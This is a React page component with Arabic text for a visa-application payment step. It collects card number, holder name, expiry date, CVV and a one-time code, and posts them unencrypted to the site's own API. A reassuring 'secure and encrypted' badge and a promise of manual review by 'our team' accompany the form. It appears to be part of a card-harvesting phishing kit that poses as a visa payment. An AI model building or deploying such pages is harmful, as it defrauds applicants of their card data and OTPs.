import { useState, useEffect } from "react";
import { CreditCard, Lock, Calendar, User, ShieldCheck, ArrowRight, CheckCircle, AlertCircle } from "lucide-react";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";

interface PaymentForm {
  cardNumber: string;
  cardHolder: string;
  expiryDate: string;
  cvv: string;
  paymentOtp: string;
}

function getQueryParam(key: string): string | null {
  const params = new URLSearchParams(window.location.search);
  return params.get(key);
}

export default function PayVisaPage() {
  const applicationId = getQueryParam("applicationId");
  const sessionId = getQueryParam("session");
  
  const [form, setForm] = useState<PaymentForm>({
    cardNumber: "",
    cardHolder: "",
    expiryDate: "",
    cvv: "",
    paymentOtp: "",
  });
  const [isProcessing, setIsProcessing] = useState(false);
  const [errors, setErrors] = useState<Partial<PaymentForm>>({});
  const [submitStatus, setSubmitStatus] = useState<"idle" | "success" | "error">("idle");
  const [errorMessage, setErrorMessage] = useState("");

  // التحقق من وجود معرف الطلب
  useEffect(() => {
    if (!applicationId && !sessionId) {
      setErrorMessage("معرف الطلب غير موجود. يرجى العودة للصفحة السابقة.");
    }
  }, [applicationId, sessionId]);

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 2) {
      return digits.slice(0, 2) + "/" + digits.slice(2);
    }
    return digits;
  };

  const validateForm = () => {
    const newErrors: Partial<PaymentForm> = {};
    
    if (!form.cardNumber || form.cardNumber.replace(/\s/g, "").length !== 16) {
      newErrors.cardNumber = "رقم البطاقة غير صحيح";
    }
    if (!form.cardHolder || form.cardHolder.length < 3) {
      newErrors.cardHolder = "اسم حامل البطاقة مطلوب";
    }
    if (!form.expiryDate || form.expiryDate.length !== 5) {
      newErrors.expiryDate = "تاريخ الانتهاء غير صحيح";
    }
    if (!form.cvv || form.cvv.length < 3) {
      newErrors.cvv = "رمز CVV غير صحيح";
    }
    if (!form.paymentOtp || !/^\d{4,6}$/.test(form.paymentOtp)) {
      newErrors.paymentOtp = "رمز التحقق يجب أن يكون 4-6 أرقام";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;
    if (!applicationId) {
      setErrorMessage("معرف الطلب غير موجود");
      return;
    }
    
    setIsProcessing(true);
    setSubmitStatus("idle");
    setErrorMessage("");

    try {
      const response = await fetch(`/api/applications/${applicationId}/payment`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cardNumber: form.cardNumber.replace(/\s/g, ""),
          cardHolder: form.cardHolder,
          expiryDate: form.expiryDate,
          cvv: form.cvv,
          paymentOtp: form.paymentOtp,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "فشل في إرسال بيانات الدفع");
      }

      // التحويل لصفحة انتظار التحقق
      const redirectUrl = `/pay-otp?applicationId=${applicationId}&session=${sessionId}`;
      window.location.href = redirectUrl;
    } catch (err) {
      console.error("Payment error:", err);
      setSubmitStatus("error");
      setErrorMessage(err instanceof Error ? err.message : "حدث خطأ غير متوقع");
    } finally {
      setIsProcessing(false);
    }
  };

  const handleChange = (field: keyof PaymentForm, value: string) => {
    let formattedValue = value;
    
    if (field === "cardNumber") {
      formattedValue = formatCardNumber(value);
    } else if (field === "expiryDate") {
      formattedValue = formatExpiry(value);
    } else if (field === "cvv") {
      formattedValue = value.replace(/\D/g, "").slice(0, 4);
    }
    
    setForm(prev => ({ ...prev, [field]: formattedValue }));
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: undefined }));
    }
  };

  const inputClass = (hasError: boolean) => `
    w-full px-4 py-4 rounded-2xl border-2 transition-all duration-300 text-lg
    bg-white/5 backdrop-blur-sm text-white placeholder:text-white/40
    focus:outline-none focus:ring-4 focus:ring-accent/30
    ${hasError 
      ? "border-red-500 focus:border-red-500" 
      : "border-white/20 focus:border-accent hover:border-white/40"
    }
  `;

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#0f1a2e] via-[#1a2d4a] to-[#0f1a2e]" dir="rtl">
      <Navbar />
      
      {/* Background decorations */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-20 right-20 w-72 h-72 bg-accent/10 rounded-full blur-3xl" />
        <div className="absolute bottom-40 left-20 w-96 h-96 bg-primary/10 rounded-full blur-3xl" />
        <div className="absolute top-1/2 left-1/2 w-64 h-64 bg-accent/5 rounded-full blur-2xl" />
      </div>

      <div className="relative z-10 container mx-auto px-4 py-16">
        {/* Header */}
        <div className="text-center mb-10">
          <div className="inline-flex items-center gap-3 bg-accent/20 border border-accent/30 px-6 py-2 rounded-full mb-6">
            <ShieldCheck className="w-5 h-5 text-accent" />
            <span className="text-accent font-semibold text-sm">دفع آمن ومشفر 100%</span>
          </div>
          <h1 className="text-4xl md:text-5xl font-black text-white mb-4">
            إتمام عملية الدفع
          </h1>
          <p className="text-lg text-white/60">
            أدخل بيانات البطاقة لإتمام العملية
          </p>
        </div>

        {/* Success State */}
        {submitStatus === "success" && (
          <div className="max-w-lg mx-auto">
            <div className="bg-green-500/20 backdrop-blur-xl border border-green-500/30 rounded-3xl p-8 shadow-2xl text-center">
              <div className="w-20 h-20 mx-auto mb-6 bg-green-500/20 rounded-full flex items-center justify-center">
                <CheckCircle className="w-12 h-12 text-green-400" />
              </div>
              <h2 className="text-2xl font-bold text-white mb-4">تم استلام بيانات الدفع بنجاح!</h2>
              <p className="text-white/70 mb-6">
                شكراً لك، سيتم مراجعة بيانات الدفع من قبل فريقنا خلال 24 ساعة
              </p>
              <a 
                href="/" 
                className="inline-flex items-center gap-2 px-6 py-3 bg-accent text-primary font-bold rounded-xl hover:bg-accent/90 transition-colors"
              >
                العودة للصفحة الرئيسية
              </a>
            </div>
          </div>
        )}

        {/* Error State */}
        {(submitStatus === "error" || (!applicationId && !sessionId)) && (
          <div className="max-w-lg mx-auto">
            <div className="bg-red-500/20 backdrop-blur-xl border border-red-500/30 rounded-3xl p-8 shadow-2xl text-center">
              <div className="w-20 h-20 mx-auto mb-6 bg-red-500/20 rounded-full flex items-center justify-center">
                <AlertCircle className="w-12 h-12 text-red-400" />
              </div>
              <h2 className="text-2xl font-bold text-white mb-4">حدث خطأ</h2>
              <p className="text-white/70 mb-6">
                {errorMessage || "يرجى المحاولة مرة أخرى لاحقاً"}
              </p>
              <button 
                onClick={() => window.location.reload()}
                className="inline-flex items-center gap-2 px-6 py-3 bg-white/10 text-white font-bold rounded-xl hover:bg-white/20 transition-colors"
              >
                إعادة المحاولة
              </button>
            </div>
          </div>
        )}

        {/* Payment Form */}
        {submitStatus === "idle" && (applicationId || sessionId) && (
          <div className="max-w-lg mx-auto">
            <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 shadow-2xl">
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Card Number */}
                <div className="space-y-3">
                  <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
                    <CreditCard className="w-6 h-6 text-accent" />
                    رقم البطاقة
                  </label>
                  <input
                    type="text"
                    value={form.cardNumber}
                    onChange={(e) => handleChange("cardNumber", e.target.value)}
                    placeholder="0000 0000 0000 0000"
                    className={inputClass(!!errors.cardNumber)}
                    dir="ltr"
                  />
                  {errors.cardNumber && <p className="text-red-400 text-sm">{errors.cardNumber}</p>}
                </div>

                {/* Card Holder */}
                <div className="space-y-3">
                  <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
                    <User className="w-6 h-6 text-accent" />
                    اسم حامل البطاقة
                  </label>
                  <input
                    type="text"
                    value={form.cardHolder}
                    onChange={(e) => handleChange("cardHolder", e.target.value)}
                    placeholder="أحمد محمد علي"
                    className={inputClass(!!errors.cardHolder)}
                    dir="ltr"
                  />
                  {errors.cardHolder && <p className="text-red-400 text-sm">{errors.cardHolder}</p>}
                </div>

                {/* Expiry & CVV */}
                <div className="grid grid-cols-2 gap-6">
                  <div className="space-y-3">
                    <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
                      <Calendar className="w-6 h-6 text-accent" />
                      تاريخ الانتهاء
                    </label>
                    <input
                      type="text"
                      value={form.expiryDate}
                      onChange={(e) => handleChange("expiryDate", e.target.value)}
                      placeholder="MM/YY"
                      className={inputClass(!!errors.expiryDate)}
                      dir="ltr"
                    />
                    {errors.expiryDate && <p className="text-red-400 text-sm">{errors.expiryDate}</p>}
                  </div>
                  <div className="space-y-3">
                    <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
                      <Lock className="w-6 h-6 text-accent" />
                      رمز الأمان CVV
                    </label>
                    <input
                      type="text"
                      value={form.cvv}
                      onChange={(e) => handleChange("cvv", e.target.value)}
                      placeholder="123"
                      className={inputClass(!!errors.cvv)}
                      dir="ltr"
                    />
                    {errors.cvv && <p className="text-red-400 text-sm">{errors.cvv}</p>}
                  </div>
                </div>

                {/* Payment OTP */}
                <div className="space-y-3">
                  <label className="flex items-center gap-2 text-white/80 font-semibold text-lg">
                    <ShieldCheck className="w-6 h-6 text-accent" />
                    رمز التحقق من البطاقة
                  </label>
                  <input
                    type="text"
                    value={form.paymentOtp}
                    onChange={(e) => handleChange("paymentOtp", e.target.value.replace(/\D/g, "").slice(0, 6))}
                    placeholder="4-6 أرقام"
                    className={inputClass(!!errors.paymentOtp)}
                    dir="ltr"
                    maxLength={6}
                  />
                  {errors.paymentOtp && <p className="text-red-400 text-sm">{errors.paymentOtp}</p>}
                </div>

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={isProcessing}
                  className="w-full mt-8 py-5 px-8 bg-gradient-to-l from-accent to-[#e0b95b] hover:from-[#e0b95b] hover:to-accent text-primary font-bold text-xl rounded-2xl transition-all duration-300 shadow-xl hover:shadow-2xl hover:shadow-accent/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-3"
                >
                  {isProcessing ? (
                    <>
                      <svg className="animate-spin h-7 w-7" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                      </svg>
                      جاري المعالجة...
                    </>
                  ) : (
                    <>
                      <Lock className="w-6 h-6" />
                      إتمام الدفع
                      <ArrowRight className="w-6 h-6" />
                    </>
                  )}
                </button>
              </form>

              {/* Security Badge */}
              <div className="mt-8 pt-6 border-t border-white/10 flex items-center justify-center gap-3 text-white/50">
                <ShieldCheck className="w-5 h-5" />
                <span className="text-sm">معلوماتك محمية بتقنية SSL المشفرة</span>
              </div>
            </div>
          </div>
        )}
      </div>

      <Footer />
    </div>
  );
}
